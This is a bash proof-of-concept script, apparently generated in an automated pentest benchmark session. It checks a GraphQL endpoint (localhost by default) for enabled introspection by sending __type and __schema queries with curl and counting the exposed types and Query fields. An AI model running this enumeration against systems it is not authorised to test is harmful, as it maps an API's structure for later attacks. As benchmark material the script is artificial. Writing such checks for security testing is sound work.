#!/bin/bash
# POC: Demonstrates GraphQL introspection vulnerability by querying __schema and __type to enumerate the complete GraphQL schema
# Target: ./repo
# Created: 2025-11-10T15:08:01.495Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# GraphQL Introspection Vulnerability POC
# Tests if the GraphQL endpoint allows introspection queries
# which exposes the complete schema structure

TARGET_URL="${1:-http://localhost:8000/graphql/}"

echo "[*] Testing GraphQL Introspection Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: __type introspection query
echo "[*] Test 1: Querying __type introspection..."
echo ""

RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"__Type\") { name description } }"}')

echo "[+] Response from __type query:"
echo "$RESPONSE1" | jq '.' 2>/dev/null || echo "$RESPONSE1"
echo ""

# Check if introspection returned data
if echo "$RESPONSE1" | grep -q "__Type\|name"; then
    echo "[✓] Introspection query successful - __type endpoint exposed"
    INTROSPECTION_ENABLED=1
else
    echo "[✗] Introspection query failed or blocked"
    INTROSPECTION_ENABLED=0
fi

echo ""
echo "[*] Test 2: Querying full __schema..."
echo ""

# Test 2: Full schema enumeration
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind description } } }"}')

echo "[+] Response from __schema query (types enumeration):"
echo "$RESPONSE2" | jq '.' 2>/dev/null || echo "$RESPONSE2"
echo ""

# Count types returned
TYPE_COUNT=$(echo "$RESPONSE2" | jq '.data.__schema.types | length' 2>/dev/null)
if [ -n "$TYPE_COUNT" ] && [ "$TYPE_COUNT" -gt 0 ]; then
    echo "[✓] Schema enumeration successful - Found $TYPE_COUNT types"
    echo "[+] Introspection is ENABLED and allows schema discovery"
else
    echo "[✗] Could not enumerate schema types"
fi

echo ""
echo "[*] Test 3: Querying Query root type fields..."
echo ""

# Test 3: Enumerate Query type fields
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"Query\") { name fields { name type { name kind } args { name } } } }"}')

echo "[+] Response from Query type fields:"
echo "$RESPONSE3" | jq '.' 2>/dev/null || echo "$RESPONSE3"
echo ""

FIELD_COUNT=$(echo "$RESPONSE3" | jq '.data.__type.fields | length' 2>/dev/null)
if [ -n "$FIELD_COUNT" ] && [ "$FIELD_COUNT" -gt 0 ]; then
    echo "[✓] Query type introspection successful - Found $FIELD_COUNT fields"
    echo "[+] Attackers can discover all available operations"
else
    echo "[✗] Could not enumerate Query fields"
fi

echo ""
echo "=== VULNERABILITY ASSESSMENT ==="
if [ "$INTROSPECTION_ENABLED" -eq 1 ]; then
    echo "[!] VULNERABILITY CONFIRMED: GraphQL introspection is ENABLED"
    echo "[!] Attackers can enumerate:"
    echo "    - All available types in the schema"
    echo "    - All query operations and fields"
    echo "    - Field arguments and types"
    echo "    - Internal API structure without documentation"
    exit 0
else
    echo "[*] Introspection appears to be disabled or restricted"
    exit 1
fi